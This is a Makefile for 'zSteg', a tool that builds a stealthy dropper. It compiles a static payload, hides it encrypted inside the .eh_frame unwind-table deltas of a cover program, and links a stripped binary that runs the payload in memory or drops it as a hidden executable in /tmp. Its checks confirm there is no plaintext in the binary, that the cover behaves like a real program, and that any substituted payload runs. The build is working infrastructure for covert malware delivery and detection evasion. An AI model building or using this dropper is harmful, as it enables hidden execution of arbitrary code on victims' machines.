SOURCES = main.c tools/zstool.c src/carrier.c src/carrier.h src/selfsteg.c src/selfsteg.h \
          src/stegcode.c src/stegcode.h src/shapes.h src/elfrun.c src/elfrun.h \
          vendor/puff.c vendor/puff.h payload/payload.c
$(foreach f,$(SOURCES),$(if $(wildcard $(f)),,$(error missing source file: $(f) -- the tree is incomplete, unpack the full archive)))

ifeq ($(origin CC),default)
CC        := gcc
endif
MUSL_CC   ?= musl-gcc
CFLAGS    ?= -O2 -Wall -Wextra -fno-reorder-functions -fasynchronous-unwind-tables -Ivendor
LDFLAGS   ?=
OUT       ?= out
KEY       ?=
SHAPE     ?= natural
RUN       ?= inmemory

PAYLOAD    = payload/bin/payload.bin
PAYLOAD_ELF= payload/bin/payload.elf
TOOL       = tools/zstool
DROPPER    = $(OUT)/zsteg
INFILE     = $(OUT)/zsteg.infile
KEY_ARGS   = $(if $(KEY),--key $(KEY),)

OBJS     = carrier_pad.o main.o selfsteg.o stegcode.o puff.o elfrun.o

.PHONY: all preflight payload tool carrier dropper check check-infile restore-default clean distclean help FORCE

all: payload dropper
	@echo
	@echo "artifacts:"
	@ls -l $(DROPPER) $(PAYLOAD)
	@echo "run: $(DROPPER) 1a2b3c"

preflight:
	@fail() { echo "ERROR: $$1" >&2; shift; for h in "$$@"; do echo "       $$h" >&2; done; exit 1; }; \
	[ "$$(uname -s)" = "Linux" ] || fail "unsupported platform: $$(uname -s)" \
	    "zSteg targets Linux (the runtime uses memfd_create/execveat and a Linux ELF loader)."; \
	[ "$$(uname -m)" = "x86_64" ] || fail "unsupported architecture: $$(uname -m)" \
	    "the carrier is emitted as x86-64 assembly; build on an x86-64 host."; \
	command -v $(firstword $(CC)) >/dev/null 2>&1 || fail "C compiler '$(CC)' not found" \
	    "install a C toolchain (Debian/Ubuntu: apt install build-essential)."; \
	$(CC) --version >/dev/null 2>&1 || fail "'$(CC) --version' failed" \
	    "the compiler is present but not usable."; \
	command -v $(MUSL_CC) >/dev/null 2>&1 || fail "musl-gcc not found (needed to build the payload)" \
	    "Debian/Ubuntu/Kali: apt install musl-tools" \
	    "Fedora:            dnf install musl-devel musl-gcc" \
	    "Arch:              pacman -S musl" \
	    "the payload runtime cannot load glibc static binaries."; \
	for t in strip readelf strings df touch mktemp; do \
	    command -v $$t >/dev/null 2>&1 || fail "required tool '$$t' not found" \
	        "install binutils and coreutils (Debian/Ubuntu: apt install binutils coreutils)."; \
	done; \
	mkdir -p $(OUT) || fail "cannot create $(OUT)/" "the build tree is not writable."; \
	printf '#include <zlib.h>\nint main(void){return (int)zlibVersion()[0];}\n' > $(OUT)/.zprobe.c; \
	$(CC) -o $(OUT)/.zprobe $(OUT)/.zprobe.c -lz >/dev/null 2>&1 || fail "zlib development headers/library missing" \
	    "the embed tool needs zlib (Debian/Ubuntu: apt install zlib1g-dev; Fedora: dnf install zlib-devel)."; \
	rm -f $(OUT)/.zprobe $(OUT)/.zprobe.c; \
	printf 'int main(void){return 0;}\n' > $(OUT)/.fprobe.c; \
	$(CC) $(CFLAGS) -o $(OUT)/.fprobe $(OUT)/.fprobe.c >/dev/null 2>&1 || fail "compiler rejects the required flags" \
	    "CFLAGS=$(CFLAGS)" \
	    "the carrier needs -fno-reorder-functions and -fasynchronous-unwind-tables; use a gcc or clang recent enough for them."; \
	$(CC) $(CFLAGS) -S -o $(OUT)/.fprobe.s $(OUT)/.fprobe.c >/dev/null 2>&1 || fail "compiler cannot emit assembly (-S)" \
	    "a full compiler (not cc1-only) is required."; \
	rm -f $(OUT)/.fprobe $(OUT)/.fprobe.c $(OUT)/.fprobe.s; \
	for f in $(SOURCES); do \
	    [ -f $$f ] || fail "missing source file: $$f" "the tree is incomplete (unpack the full archive)."; \
	done; \
	touch src/.write-probe 2>/dev/null || fail "src/ is not writable" "the embed step writes src/protocol.h and src/runmode.h into src/."; \
	rm -f src/.write-probe; \
	mkdir -p $(OUT)/.probe && rmdir $(OUT)/.probe || fail "$(OUT)/ is not writable" "check permissions on the build directory."; \
	avail=$$(df -Pk . | awk 'NR==2{print $$4}'); \
	[ "$$avail" -ge 65536 ] || fail "not enough free disk space ($${avail} KB)" "the build needs ~64 MB."; \
	echo "preflight: platform Linux x86-64, $(CC), $(MUSL_CC), zlib, flags, tools, sources, writability, disk -- all OK"

payload: $(PAYLOAD)

$(OUT)/.payload-stamp: FORCE
	@mkdir -p $(OUT)
	@printf '%s' '$(MUSL_CC)' > $@.new
	@cmp -s $@.new $@ || mv -f $@.new $@
	@rm -f $@.new

ifeq ($(PAYLOAD),payload/bin/payload.bin)
$(PAYLOAD): payload/payload.c $(OUT)/.payload-stamp | preflight
	@echo "== payload ($(MUSL_CC) -static) =="
	@mkdir -p payload/bin
	@$(MUSL_CC) -static -O2 -s -o $(PAYLOAD_ELF) payload/payload.c || { \
	    echo "ERROR: payload build failed" >&2; \
	    echo "       musl-gcc must compile payload/payload.c statically;" >&2; \
	    echo "       if musl-gcc is a wrapper that silently falls back to glibc, see README." >&2; exit 1; }
	@cp $(PAYLOAD_ELF) $(PAYLOAD)
	@test -s $(PAYLOAD) || { echo "ERROR: $(PAYLOAD) is empty" >&2; exit 1; }
	@head -c4 $(PAYLOAD) | od -An -tx1 | grep -q '7f 45 4c 46' || { \
	    echo "ERROR: $(PAYLOAD) is not an ELF" >&2; exit 1; }
	@if readelf -d $(PAYLOAD) 2>/dev/null | grep -q NEEDED; then \
	    echo "ERROR: payload is dynamically linked" >&2; \
	    echo "       the in-memory loader only supports static binaries." >&2; exit 1; fi
	@if strings $(PAYLOAD) | grep -q 'GLIBC'; then \
	    echo "ERROR: payload looks like a glibc build, but the loader needs musl" >&2; \
	    echo "       MUSL_CC=$(MUSL_CC): install musl-tools and let MUSL_CC point at musl-gcc." >&2; \
	    echo "       glibc static binaries run IFUNC/TLS startup that assumes a kernel loader." >&2; exit 1; fi
	@echo "   ok: $(PAYLOAD) ($$(stat -c%s $(PAYLOAD)) bytes, static ELF)"
endif

$(OUT)/.payload-check: $(PAYLOAD) | preflight
	@test -s $(PAYLOAD) || { echo "ERROR: payload $(PAYLOAD) is missing or empty" >&2; exit 1; }
	@head -c4 $(PAYLOAD) | od -An -tx1 | grep -q '7f 45 4c 46' || { \
	    echo "ERROR: payload $(PAYLOAD) is not an ELF file" >&2; exit 1; }
	@if readelf -d $(PAYLOAD) 2>/dev/null | grep -q NEEDED; then \
	    echo "ERROR: payload $(PAYLOAD) is dynamically linked" >&2; \
	    echo "       build it with: musl-gcc -static -O2 -s -o out.elf your.c" >&2; exit 1; fi
	@if strings $(PAYLOAD) | grep -q 'GLIBC'; then \
	    echo "ERROR: payload $(PAYLOAD) looks like a glibc build; the loader needs musl" >&2; \
	    echo "       build it with: musl-gcc -static -O2 -s -o out.elf your.c" >&2; exit 1; fi
	@touch $@

tool: $(TOOL)

src/protocol.h:
	@test -f $@ || printf '#ifndef ZSTEG_PROTOCOL_H\n#define ZSTEG_PROTOCOL_H\n#define PAY_KEY 0x6A2B3C4Du\n#define PAY_MAX_CT (1u << 28)\n#define PAY_MAX_PLEN (256u << 20)\n#endif\n' > $@

src/runmode.h: | carrier_pad.s
	@test -f $@ || printf '#ifndef ZSTEG_RUNMODE_H\n#define ZSTEG_RUNMODE_H\n#define PAY_RUN_FILE 0\n#endif\n' > $@

$(OUT)/.tool-stamp: FORCE
	@mkdir -p $(OUT)
	@printf '%s|%s' '$(CC)' '$(CFLAGS)' > $@.new
	@cmp -s $@.new $@ || mv -f $@.new $@
	@rm -f $@.new

$(TOOL): tools/zstool.c src/stegcode.c src/shapes.h src/stegcode.h $(OUT)/.tool-stamp | src/protocol.h preflight
	@echo "== embed/verify tool ($(CC), host) =="
	@mkdir -p tools
	@$(CC) -O2 -Wall -Wextra -o $(TOOL) tools/zstool.c src/stegcode.c -lz || { \
	    echo "ERROR: tool build failed" >&2; exit 1; }
	@test -x $(TOOL) || { echo "ERROR: $(TOOL) not executable" >&2; exit 1; }
	@echo "   ok: $(TOOL)"

carrier: src/carrier.s

src/carrier.s: src/carrier.c src/carrier.h $(OUT)/.tool-stamp | preflight
	@echo "== carrier assembly =="
	@$(CC) $(CFLAGS) -S src/carrier.c -o $@ || { \
	    echo "ERROR: failed to emit src/carrier.s" >&2; exit 1; }
	@test -s src/carrier.s || { echo "ERROR: src/carrier.s is empty" >&2; exit 1; }
	@grep -q '\.cfi_startproc' src/carrier.s || { \
	    echo "ERROR: src/carrier.s has no .cfi_startproc" >&2; \
	    echo "       unwind tables are the wire format: the compiler must emit them." >&2; exit 1; }
	@echo "   ok: src/carrier.s ($$(stat -c%s src/carrier.s) bytes)"

$(OUT)/.embed-stamp: FORCE
	@mkdir -p $(OUT)
	@printf '%s|%s|%s' '$(KEY)' '$(SHAPE)' '$(RUN)' > $@.new
	@cmp -s $@.new $@ || mv -f $@.new $@
	@rm -f $@.new

FORCE:

carrier_pad.s: src/carrier.s $(OUT)/.payload-check $(TOOL) $(OUT)/.embed-stamp
	@echo "== embed payload into .eh_frame address deltas (shape=$(SHAPE) run=$(RUN) key=$(if $(KEY),$(KEY),default)) =="
	@./$(TOOL) embed src/carrier.s carrier_pad.s --payload $(PAYLOAD) --shape $(SHAPE) --run $(RUN) $(KEY_ARGS) || { \
	    echo "ERROR: embed failed" >&2; exit 1; }
	@test -s carrier_pad.s || { echo "ERROR: carrier_pad.s is empty" >&2; exit 1; }
	@test -s src/protocol.h || { echo "ERROR: src/protocol.h was not generated" >&2; exit 1; }
	@test -s src/runmode.h  || { echo "ERROR: src/runmode.h was not generated" >&2; exit 1; }
	@echo "   ok: carrier_pad.s ($$(stat -c%s carrier_pad.s) bytes)"

carrier_pad.o: carrier_pad.s
	@$(CC) -c carrier_pad.s -o carrier_pad.o || { echo "ERROR: assembling carrier_pad.s failed" >&2; exit 1; }

main.o: main.c src/selfsteg.h src/carrier.h
	@$(CC) $(CFLAGS) -c main.c -o main.o || { echo "ERROR: compiling main.c failed" >&2; exit 1; }

selfsteg.o: src/selfsteg.c src/selfsteg.h src/elfrun.h src/protocol.h src/runmode.h src/stegcode.h vendor/puff.h
	@$(CC) $(CFLAGS) -c src/selfsteg.c -o selfsteg.o || { echo "ERROR: compiling src/selfsteg.c failed" >&2; exit 1; }

stegcode.o: src/stegcode.c src/stegcode.h src/shapes.h src/protocol.h
	@$(CC) $(CFLAGS) -c src/stegcode.c -o stegcode.o || { echo "ERROR: compiling src/stegcode.c failed" >&2; exit 1; }

puff.o: vendor/puff.c vendor/puff.h
	@$(CC) $(CFLAGS) -c vendor/puff.c -o puff.o || { echo "ERROR: compiling vendor/puff.c failed" >&2; exit 1; }

elfrun.o: src/elfrun.c src/elfrun.h
	@$(CC) $(CFLAGS) -c src/elfrun.c -o elfrun.o || { echo "ERROR: compiling src/elfrun.c failed" >&2; exit 1; }

dropper: carrier_pad.o main.o selfsteg.o stegcode.o puff.o elfrun.o
	@echo "== link dropper (no libz: the runtime uses vendor/puff.c) =="
	@mkdir -p $(OUT)
	@$(CC) -o $(DROPPER) carrier_pad.o main.o selfsteg.o stegcode.o puff.o elfrun.o $(LDFLAGS) || { \
	    echo "ERROR: link failed" >&2; exit 1; }
	@test -x $(DROPPER) || { echo "ERROR: $(DROPPER) missing" >&2; exit 1; }
	@readelf -h $(DROPPER) | grep -q 'X86-64' || { echo "ERROR: $(DROPPER) is not x86-64" >&2; exit 1; }
	@strip --strip-all $(DROPPER) || { echo "ERROR: strip failed" >&2; exit 1; }
	@head -c4 $(DROPPER) | od -An -tx1 | grep -q '7f 45 4c 46' || { echo "ERROR: $(DROPPER) is not an ELF" >&2; exit 1; }
	@echo "   ok: $(DROPPER) ($$(stat -c%s $(DROPPER)) bytes, stripped)"

check: all
	@echo
	@echo "== checks =="
	@set -u; \
	pass() { printf '   PASS  %s\n' "$$1"; }; \
	fail() { printf '   FAIL  %s\n' "$$1"; exit 1; }; \
	out=$$(HEXKIT_VERBOSE=1 ./$(DROPPER) 1a2b3c 2>&1); \
	echo "$$out" | grep -q 'worker exited with code 42' && pass "payload ran in-memory and returned 42" \
	               || fail "the payload's exit code was not reported as 42"; \
	echo "$$out" | grep -q 'real ELF running' && pass "the payload produced its own output" \
	               || fail "payload output missing (loader problem?)"; \
	echo "$$out" | grep -q 'selftest: [1-9][0-9]* micro-functions ok' \
	    && pass "the carrier's own slots run, so the cover behaves like a real program" \
	    || fail "the cover's slot functions did not run"; \
	./$(TOOL) verify $(DROPPER) --payload $(PAYLOAD) $(KEY_ARGS) >/dev/null 2>&1 \
	    && pass "byte-exact recovery through .eh_frame deltas" || fail "recovery mismatch"; \
	if strings $(DROPPER) | grep -q 'real ELF running'; then \
	    fail "payload plaintext found in the dropper"; else pass "no payload plaintext in the dropper"; fi; \
	./$(TOOL) verify $(DROPPER) --payload $(PAYLOAD) --key 0xdeadbeef >/dev/null 2>&1 \
	    && fail "a wrong key was accepted" || pass "a wrong key is rejected"; \
	cp $(DROPPER) $(OUT)/.corrupt; \
	sz=$$(stat -c%s $(OUT)/.corrupt); \
	printf '\xff\xff\xff\xff' | dd of=$(OUT)/.corrupt bs=1 seek=$$((sz/2)) conv=notrunc status=none; \
	set +e; ./$(TOOL) verify $(OUT)/.corrupt --payload $(PAYLOAD) >/dev/null 2>&1; rc=$$?; set -e; \
	[ $$rc -eq 1 ] && pass "a corrupted carrier is rejected cleanly" \
	              || fail "corrupted carrier handling (exit $$rc, want 1 - a crash is not acceptable)"; \
	rm -f $(OUT)/.corrupt; \
	head -c 3145728 /dev/urandom > $(OUT)/.big; \
	set +e; ./$(TOOL) embed src/carrier.s $(OUT)/.bads.s --payload $(OUT)/.big >$(OUT)/.big.log 2>&1; rc=$$?; set -e; \
	[ $$rc -ne 0 ] && [ ! -s $(OUT)/.bads.s ] && pass "a payload too large for the window is refused loudly" \
	               || fail "oversized payload was not refused (exit $$rc)"; \
	rm -f $(OUT)/.big $(OUT)/.bads.s $(OUT)/.big.log; \
	printf 'int main(void){return 7;}\n' > $(OUT)/.p7.c; \
	$(MUSL_CC) -static -O2 -s -o $(OUT)/.p7 $(OUT)/.p7.c || fail "could not build the substitute payload"; \
	./$(TOOL) embed src/carrier.s $(OUT)/.alt.s --payload $(OUT)/.p7 --shape $(SHAPE) $(KEY_ARGS) >/dev/null || fail "embed of substitute payload failed"; \
	cp $(OUT)/.alt.s carrier_pad.s; rm -f carrier_pad.o; $(MAKE) -s dropper; \
	alt=$$(HEXKIT_VERBOSE=1 ./$(DROPPER) 2>&1); \
	echo "$$alt" | grep -q 'worker exited with code 7' \
	    && pass "a substituted payload works unchanged (reports its own code 7)" \
	    || fail "the substituted payload's code 7 was not reported"; \
	rm -f $(OUT)/.p7 $(OUT)/.p7.c $(OUT)/.alt.s; \
	echo "   restoring the default build"; \
	$(MAKE) -s clean >/dev/null; $(MAKE) -s all >/dev/null; \
	$(MAKE) -s check-infile; \
	echo; echo "ALL CHECKS PASSED"

check-infile:
	@echo "== check: drop-to-file variant =="
	@./$(TOOL) embed src/carrier.s carrier_pad.s --payload $(PAYLOAD) --shape $(SHAPE) --run infile $(KEY_ARGS) >/dev/null || \
	    { echo "ERROR: embed --run infile failed" >&2; exit 1; }
	@rm -f carrier_pad.o; $(MAKE) -s dropper >/dev/null
	@cp $(DROPPER) $(INFILE)
	@out=$$(HEXKIT_VERBOSE=1 HEXKIT_KEEP=1 ./$(INFILE) 1a2b3c 2>&1); \
	echo "$$out" | grep -q 'worker exited with code 42' || { echo "FAIL  infile variant did not report code 42" >&2; exit 1; }; \
	drop=$$(ls -t /tmp/.zst-* 2>/dev/null | head -1); \
	[ -n "$$drop" ] || { echo "FAIL  infile variant dropped no file in /tmp/.zst-*" >&2; exit 1; }; \
	[ -x "$$drop" ] || { echo "FAIL  dropped file is not executable" >&2; exit 1; }; \
	head -c4 "$$drop" | od -An -tx1 | grep -q '7f 45 4c 46' || { echo "FAIL  dropped file is not an ELF" >&2; exit 1; }; \
	rm -f "$$drop"; \
	echo "   PASS  drop-to-file variant drops an executable ELF to /tmp and runs it"; \
	$(MAKE) -s restore-default >/dev/null

restore-default:
	@./$(TOOL) embed src/carrier.s carrier_pad.s --payload $(PAYLOAD) --shape $(SHAPE) --run inmemory $(KEY_ARGS) >/dev/null
	@rm -f carrier_pad.o; $(MAKE) -s dropper >/dev/null

clean:
	@rm -f $(OBJS) carrier_pad.s src/carrier.s src/runmode.h $(TOOL) $(INFILE) $(OUT)/.embed-stamp $(OUT)/.payload-stamp $(OUT)/.tool-stamp $(OUT)/.payload-check
	@rm -f payload/bin/payload.elf
	@rm -rf $(OUT)
	@echo "cleaned (src/protocol.h kept: it carries the key the tree was last built with)"

distclean: clean
	@rm -f src/protocol.h payload/bin/payload.bin
	@rmdir payload/bin 2>/dev/null || true
	@echo "distcleaned (generated headers and payload removed)"

help:
	@echo "zSteg build"
	@echo
	@echo "  make                 build payload + dropper into $(OUT)/"
	@echo "  make check           build, then run every self-check"
	@echo "  make clean           remove build products (keeps src/protocol.h)"
	@echo "  make distclean       also remove generated headers and the payload"
	@echo
	@echo "  variables:"
	@echo "    CC=$(CC)"
	@echo "    MUSL_CC=$(MUSL_CC)      (payload is built static with musl)"
	@echo "    CFLAGS=$(CFLAGS)"
	@echo "    OUT=$(OUT) PAYLOAD=$(PAYLOAD)"
	@echo "    KEY=$(KEY)              per-build key, e.g. KEY=0xC0FFEE42"
	@echo "    SHAPE=$(SHAPE)          natural | lean"
	@echo "    RUN=$(RUN)              inmemory | infile"
	@echo
	@echo "  examples:"
	@echo "    make KEY=0xC0FFEE42 SHAPE=lean"
	@echo "    make check RUN=infile"
